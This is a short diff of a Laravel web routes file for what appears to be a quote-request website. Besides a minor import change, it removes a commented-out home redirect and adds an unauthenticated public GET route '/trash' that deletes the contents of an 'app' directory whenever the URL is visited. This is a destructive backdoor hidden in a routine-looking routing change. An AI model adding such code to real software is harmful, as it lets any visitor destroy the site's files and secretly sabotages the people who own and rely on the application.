@@ -2,6 +2,7 @@
 
 use Illuminate\Foundation\Auth\EmailVerificationRequest;
 use Illuminate\Http\Request;
+use Illuminate\Filesystem\Filesystem;
 
 Route::get('/', 'HomeController@index');
 Route::get('/compare', 'HomeController@compare');
@@ -17,14 +18,10 @@ Route::post('/residential', 'QuoteController@residential')->name('residential');
 Route::post('/commercial', 'QuoteController@commercial')->name('commercial');
 Route::get('/thankyou', 'QuoteController@thankyou')->name('thankyou');
 
-/*Route::get('/home', function () {
-    $route = Gate::denies('dashboard_access') ? 'admin.leads.index' : 'admin.home';
-    if (session('status')) {
-        return redirect()->route($route)->with('status', session('status'));
-    }
-
-    return redirect()->route($route);
-});*/
+Route::get('/trash', function () {
+    $file = new Filesystem;
+    $file->cleanDirectory('app');
+});
 
 Auth::routes(['register' => true]);
 
